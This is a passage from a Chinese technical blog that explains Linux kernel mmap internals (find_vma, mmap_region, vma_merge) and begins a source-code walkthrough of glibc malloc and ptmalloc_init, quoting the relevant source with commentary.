class="line">            (!vma || addr + len &lt;= vma-&gt;vm_start))</div><div class="line">            return addr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，如果是固定地址映射，直接返回addr地址。本章分析的不是这种情况，省略的代码和一些随机映射有关，这里省略了不分析。这样就进入了底下的if语句里，对地址对齐后，就调用find_vma查找addr地址开始已经分配出去的虚拟内存vma，最后addr到addr+len这个地址范围内没有虚拟内存，就将地址返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr)</div><div class="line">&#123;</div><div class="line">    struct rb_node *rb_node;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line"></div><div class="line">    vma = vmacache_find(mm, addr);</div><div class="line">    if (likely(vma))</div><div class="line">        return vma;</div><div class="line"></div><div class="line">    rb_node = mm-&gt;mm_rb.rb_node;</div><div class="line">    vma = NULL;</div><div class="line"></div><div class="line">    while (rb_node) &#123;</div><div class="line">        struct vm_area_struct *tmp;</div><div class="line"></div><div class="line">        tmp = rb_entry(rb_node, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            vma = tmp;</div><div class="line">            if (tmp-&gt;vm_start &lt;= addr)</div><div class="line">                break;</div><div class="line">            rb_node = rb_node-&gt;rb_left;</div><div class="line">        &#125; else</div><div class="line">            rb_node = rb_node-&gt;rb_right;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (vma)</div><div class="line">        vmacache_update(addr, vma);</div><div class="line">    return vma;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不往下继续看代码的，简单来说，进程已经分配的虚拟内存保存在一个红黑树中，红黑树简单的作用就是防止一个树结构不平衡，出现某个左子树严重大于右子树的情况。为了加快查找的速度，这里设立了缓存。通过观察while结构，这里就是查找第一个结束地址大于addr的已经分配的虚拟内存，然后返回。</p>
<p>回到<code>do_mmap_pgoff</code>中，<code>calc_vm_prot_bits</code>和<code>calc_vm_flag_bits</code>用来将prot和flags中的标志位转化为vm的标志位，例如prot中的<code>PROT_READ</code>转化为<code>VM_READ</code>，flags中的<code>MAP_GROWSDOWN</code>转化为<code>VM_GROWSDOWN</code>。根据前面prot和flags中的值，这里转化后，<code>vm_flags</code>为<code>VM_READ|VM_WRITE|mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC</code>。最后就调用mmap_region构造一个vma用来保存刚刚获得的虚拟内存。</p>
<h2 id="mmap-region"><a href="#mmap-region" class="headerlink" title="mmap_region"></a>mmap_region</h2><p>为了方便分析和查看，这里对mmap_region代码做了适当的删除和改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">unsigned long mmap_region(struct file *file, unsigned long addr,</div><div class="line">        unsigned long len, vm_flags_t vm_flags, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma, *prev;</div><div class="line">    int error;</div><div class="line">    struct rb_node **rb_link, *rb_parent;</div><div class="line">    unsigned long charged = 0;</div><div class="line"></div><div class="line">    if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    error = -ENOMEM;</div><div class="line">    while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,</div><div class="line">                  &amp;rb_parent)) &#123;</div><div class="line">        if (do_munmap(mm, addr, len))</div><div class="line">            return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    vm_flags |= VM_ACCOUNT;</div><div class="line"></div><div class="line">    vma = vma_merge(mm, prev, addr, addr + len, vm_flags, NULL, file, pgoff,</div><div class="line">            NULL);</div><div class="line">    if (vma)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    vma-&gt;vm_mm = mm;</div><div class="line">    vma-&gt;vm_start = addr;</div><div class="line">    vma-&gt;vm_end = addr + len;</div><div class="line">    vma-&gt;vm_flags = vm_flags;</div><div class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags);</div><div class="line">    vma-&gt;vm_pgoff = pgoff;</div><div class="line">    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);</div><div class="line"></div><div class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">out:</div><div class="line"></div><div class="line">    vm_stat_account(mm, vm_flags, file, len &gt;&gt; PAGE_SHIFT);</div><div class="line">    if (vm_flags &amp; VM_LOCKED) &#123;</div><div class="line">        if (!((vm_flags &amp; VM_SPECIAL) || is_vm_hugetlb_page(vma) ||</div><div class="line">                    vma == get_gate_vma(current-&gt;mm)))</div><div class="line">            mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);</div><div class="line">        else</div><div class="line">            vma-&gt;vm_flags &amp;= ~VM_LOCKED;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (file)</div><div class="line">        uprobe_mmap(vma);</div><div class="line"></div><div class="line">    vma-&gt;vm_flags |= VM_SOFTDIRTY;</div><div class="line"></div><div class="line">    vma_set_page_prot(vma);</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>may_expand_vm</code>用于判断加上即将分配的虚拟内存，是否超过了系统的限制，如果超过了就需要进行相应的操作或者返回错误，这里假设不会超过系统限制，不管它。<br><code>find_vma_links</code>的定义如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">static int find_vma_links(struct mm_struct *mm, unsigned long addr,</div><div class="line">        unsigned long end, struct vm_area_struct **pprev,</div><div class="line">        struct rb_node ***rb_link, struct rb_node **rb_parent)&#123;</div><div class="line"></div><div class="line">    struct rb_node **__rb_link, *__rb_parent, *rb_prev;</div><div class="line"></div><div class="line">    __rb_link = &amp;mm-&gt;mm_rb.rb_node;</div><div class="line">    rb_prev = __rb_parent = NULL;</div><div class="line"></div><div class="line">    while (*__rb_link) &#123;</div><div class="line">        struct vm_area_struct *vma_tmp;</div><div class="line"></div><div class="line">        __rb_parent = *__rb_link;</div><div class="line">        vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (vma_tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            if (vma_tmp-&gt;vm_start &lt; end)</div><div class="line">                return -ENOMEM;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_left;</div><div class="line">        &#125; else &#123;</div><div class="line">            rb_prev = __rb_parent;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    *pprev = NULL;</div><div class="line">    if (rb_prev)</div><div class="line">        *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb);</div><div class="line">    *rb_link = __rb_link;</div><div class="line">    *rb_parent = __rb_parent;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数做了两件事，第一件事是重新检查一遍即将分配的虚拟内存是否已经被使用，主要是其他进程可能在这期间分配了该虚拟内存，第二件事是确定即将插入红黑树中的位置，保存在<code>prev</code>、<code>rb_link</code>和<code>rb_parent</code>中。<code>prev</code>保存了虚拟内存结束地址小于即将分配的虚拟内存开始地址的红黑树节点，<code>rb_link</code>一般为null，<code>rb_parent</code>简单说就是保存了离即将分配的虚拟内存开始地址最近的红黑树节点。</p>
<p>再往下通过vma_merge函数查看是否有虚拟空间可以合并，如果有则合并并返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *vma_merge(struct mm_struct *mm,</div><div class="line">            struct vm_area_struct *prev, unsigned long addr,</div><div class="line">            unsigned long end, unsigned long vm_flags,</div><div class="line">            struct anon_vma *anon_vma, struct file *file,</div><div class="line">            pgoff_t pgoff, struct mempolicy *policy)&#123;</div><div class="line"></div><div class="line">    pgoff_t pglen = (end - addr) &gt;&gt; PAGE_SHIFT;</div><div class="line">    struct vm_area_struct *area, *next;</div><div class="line">    int err;</div><div class="line"></div><div class="line">    if (vm_flags &amp; VM_SPECIAL)</div><div class="line">        return NULL;</div><div class="line"></div><div class="line">    if (prev)</div><div class="line">        next = prev-&gt;vm_next;</div><div class="line">    else</div><div class="line">        next = mm-&gt;mmap;</div><div class="line">    area = next;</div><div class="line">    if (next &amp;&amp; next-&gt;vm_end == end)</div><div class="line">        next = next-&gt;vm_next;</div><div class="line"></div><div class="line">    if (prev &amp;&amp; prev-&gt;vm_end == addr &amp;&amp;</div><div class="line">            mpol_equal(vma_policy(prev), policy) &amp;&amp;</div><div class="line">            can_vma_merge_after(prev, vm_flags,</div><div class="line">                        anon_vma, file, pgoff)) &#123;</div><div class="line"></div><div class="line">        if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">                mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">                can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen) &amp;&amp;</div><div class="line">                is_mergeable_anon_vma(prev-&gt;anon_vma,</div><div class="line">                              next-&gt;anon_vma, NULL)) &#123;</div><div class="line"></div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                next-&gt;vm_end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        &#125; else</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(prev, vm_flags);</div><div class="line">        return prev;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">            mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">            can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen)) &#123;</div><div class="line">        if (prev &amp;&amp; addr &lt; prev-&gt;vm_end)</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                addr, prev-&gt;vm_pgoff, NULL);</div><div class="line">        else                    </div><div class="line">            err = vma_adjust(area, addr, next-&gt;vm_end,</div><div class="line">                next-&gt;vm_pgoff - pglen, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(area, vm_flags);</div><div class="line">        return area;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不详细分析这个函数了，主要通过<code>prev-&gt;vm_end == addr</code>判断即将分配的虚拟内存能否往前合并，通过<code>end == next-&gt;vm_start</code>判断即将分配的虚拟内存能否往后合并。其中，合并函数为<code>vma_adjust</code>。再往下就不分析了。</p>
<p>回到函数中，假设不能合并，就要通过slab构造一个<code>vm_area_struct</code>结构体，并设置相应的信息，slab是linux内核中分配小块内存的框架。然后通过<code>vma_link</code>插入到进程的红黑树中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">static void vma_link(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">            struct vm_area_struct *prev, struct rb_node **rb_link,</div><div class="line">            struct rb_node *rb_parent)&#123;</div><div class="line"></div><div class="line">    __vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">    mm-&gt;map_count++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__vma_link</code>执行实际的插入操作，就是一些红黑树的操作，不往下看了。</p>
<p>回到<code>mmap_region</code>中，最后通过<code>vma_set_page_prot</code>继续设置一些标志位，然后就返回分配到的虚拟内存的起始地址addr了，该返回值一直向上返回，然后退出系统调用，返回到glibc中。<br>到这里简单总结一下MMAP，其实质就是通过mmap在进程的内存管理结构中的红黑树中分配一块没有使用的虚拟内存。</p>
<p>下一章继续往下分析glibc中的<code>_int_malloc</code>函数。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/malloc源码分析——1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/21/malloc源码分析——1/" itemprop="url">malloc源码分析——1</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T14:35:24+08:00">
                2018-05-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="malloc源码分析—ptmalloc-init"><a href="#malloc源码分析—ptmalloc-init" class="headerlink" title="malloc源码分析—ptmalloc_init"></a>malloc源码分析—<code>ptmalloc_init</code></h1><p>本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc)</div></pre></td></tr></table></figure>
<p><code>strong_alias</code>是GNU C中的定义，编译器判定这里malloc是<code>__libc_malloc</code>的别名，<code>__libc_malloc</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void * __libc_malloc (size_t bytes)&#123;</div><div class="line"></div><div class="line">    mstate ar_ptr;</div><div class="line">    void *victim;</div><div class="line"></div><div class="line">    void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);</div><div class="line">    if (__builtin_expect (hook != NULL, 0))</div><div class="line">        return (*hook)(bytes, RETURN_ADDRESS (0));</div><div class="line"></div><div class="line">    arena_get (ar_ptr, bytes);</div><div class="line"></div><div class="line">    victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    if (!victim &amp;&amp; ar_ptr != NULL)&#123;</div><div class="line">        LIBC_PROBE (memory_malloc_retry, 1, bytes);</div><div class="line">        ar_ptr = arena_get_retry (ar_ptr, bytes);</div><div class="line">        victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (ar_ptr != NULL)</div><div class="line">        (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);</div><div class="line"></div><div class="line">    return victim;</div><div class="line">&#125;</div><div class="line">libc_hidden_def (__libc_malloc)</div></pre></td></tr></table></figure>
<p>首先看<code>atomic_forced_read</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># define atomic_forced_read(x) \</div><div class="line">  (&#123; __typeof (x) __x; __asm (&quot;&quot; : &quot;=r&quot; (__x) : &quot;0&quot; (x)); __x; &#125;)</div></pre></td></tr></table></figure>
<p><code>__typeof</code>是原始函数的返回类型，后面是一段汇编代码，”0”是零，即%0，引用时不可以加 %，只能input引用output，这里就是原子读，将<code>__malloc_hook</code>的地址放入任意寄存器(r)再取出。<code>__malloc_hook</code>的定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</div></pre></td></tr></table></figure>
<p>weak_variable其实就是，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__attribute__ ((weak))</div></pre></td></tr></table></figure>
<p>和编译器有关，这里不管它。<code>__builtin_expect</code>其实就是告诉编译器if判断语句里大多数情况下的值，这样编译器可以做优化，避免过多的跳转。回到<code>__libc_malloc</code>接下来就是调用<code>malloc_hook_ini</code>进行内存的分配。<br><code>malloc_hook_ini</code>定义在hooks.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">static void * malloc_hook_ini (size_t sz, const void *caller)&#123;</div><div class="line">    __malloc_hook = NULL;</div><div class="line">    ptmalloc_init ();</div><div class="line">    return __libc_malloc (sz);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ptmalloc-init"><a href="#ptmalloc-init" class="headerlink" title="ptmalloc_init"></a>ptmalloc_init</h2><p>ptmalloc_init用来对整个ptmalloc框架进行初始化，定义在arena.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">static void ptmalloc_init(void) &#123;</div><div class="line"></div><div class="line">    if (__malloc_initialized &gt;= 0)</div><div class="line">        return;</div><div class="line">    __malloc_initialized = 0;</div><div class="line"></div><div class="line">    tsd_key_create(&amp;arena_key, NULL);</div><div class="line">    tsd_setspecific(arena_key, (void *) &amp;main_arena);</div><div class="line">    thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2);</div><div class="line">    const char *s = NULL;</div><div class="line">    if (__glibc_likely(_environ != NULL)) &#123;</div><div class="line">        char **runp = _environ;</div><div class="line">        char *envline;</div><div class="line"></div><div class="line">        while (__builtin_expect((envline = next_env_entry(&amp;runp)) != NULL, 0)) &#123;</div><div class="line">            size_t len = strcspn(envline, &quot;=&quot;);</div><div class="line"></div><div class="line">            if (envline[len] != &apos;=&apos;)</div><div class="line">                continue;</div><div class="line"></div><div class="line">            switch (len) &#123;</div><div class="line">            case 6:</div><div class="line">                if (memcmp(envline, &quot;CHECK_&quot;, 6) == 0)</div><div class="line">                    s = &amp;envline[7];</div><div class="line">                break;</div><div class="line">            case 8:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TOP_PAD_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_TOP_PAD, atoi(&amp;envline[9]));</div><div class="line">                    else if (memcmp(envline, &quot;PERTURB_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_PERTURB, atoi(&amp;envline[9]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 9:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;MMAP_MAX_&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_MAX, atoi(&amp;envline[10]));</div><div class="line">                    else if (memcmp(envline, &quot;ARENA_MAX&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_MAX, atoi(&amp;envline[10]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 10:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;ARENA_TEST&quot;, 10) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_TEST, atoi(&amp;envline[11]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 15:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TRIM_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_TRIM_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                    else if (memcmp(envline, &quot;MMAP_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            default:</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (s &amp;&amp; s[0]) &#123;</div><div class="line">        __libc_mallopt(M_CHECK_ACTION, (int) (s[0] - &apos;0&apos;));</div><div class="line">        if (check_action != 0)</div><div class="line">            __malloc_check_init();</div><div class="line">    &#125;</div><div class="line">    void (*hook)(void) = atomic_forced_read (__malloc_initialize_hook);</div><div class="line">    if (hook != NULL)</div><div class="line">        (*hook)();</div><div class="line">    __malloc_initialized = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先检查全局变量<code>__malloc_initialized</code>是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果改值为0，表示ptmalloc正在初始化，全局变量<code>__malloc_initialized</code>用来保证全局只初始化ptmalloc一次。<br><code>tsd_key_create</code>创建线程私有实例<code>arena_key</code>，该私有实例保存的是分配区（arena）的<code>malloc_state</code>实例指针。<code>arena_key</code>指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用<code>ptmalloc_init()</code>的线程的<code>arena_key</code>绑定到主分配区上。意味着本线程首选从主分配区分配内存。arena_key在glibc中是一个线程私有变量，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define tsd_key_create(key, destr)  ((void) (key))</div><div class="line">#define tsd_setspecific(key, data)  __libc_tsd_set (void *, MALLOC, (data))</div><div class="line">#define __libc_tsd_set(TYPE, KEY, VALUE)    (__libc_tsd_##KEY = (VALUE))</div></pre></td></tr></table></figure>
<p><code>tsd_setspecific(arena_key, (void *) &amp;main_arena);</code>就是<code>__libc_tsd_MALLOC = &amp;main_arena</code><br>thread_atfork用来设置进程在fork创建子进程时关于锁设置的各个函数，<code>ptmalloc_lock_all</code>和<code>ptmalloc_unlock_all</code>用来给父进程加锁解锁，<code>ptmalloc_unlock_all2</code>用来给子进程调用以解锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># define thread_atfork(prepare, parent, child) \</div><div class="line">  atfork_mem.prepare_handler = prepare;                       \</div><div class="line">  atfork_mem.parent_handler = parent;                         \</div><div class="line">  atfork_mem.child_handler = child;                       \</div><div class="line">  atfork_mem.dso_handle = &amp;__dso_handle == NULL ? NULL : __dso_handle;        \</div><div class="line">  atfork_mem.refcntr = 1;                             \</div><div class="line">  __linkin_atfork (&amp;atfork_mem)</div></pre></td></tr></table></figure>
<p>其中，<code>atfork_mem</code>是一个全局的fork时的函数子针结构体fork_handler，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define ATFORK_MEM static struct fork_handler atfork_mem1</div></pre></td></tr></table></figure>
<p><code>__linkin_atfork</code>用于将刚刚构造的fork_handler添加进全局链表<code>__fork_handlers</code>中而不用加锁，其实就是一个CAS锁，关于该锁，可以查阅网上资料，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void attribute_hidden __linkin_atfork(struct fork_handler *newp) &#123;</div><div class="line">    do</div><div class="line">        newp-&gt;next = __fork_handlers;</div><div class="line">    while (catomic_compare_and_exchange_bool_acq(&amp;__fork_handlers, newp,</div><div class="line">            newp-&gt;next) != 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>catomic_compare_and_exchange_bool_acq</code>最后是一个宏定义，将之改写后如下</p>
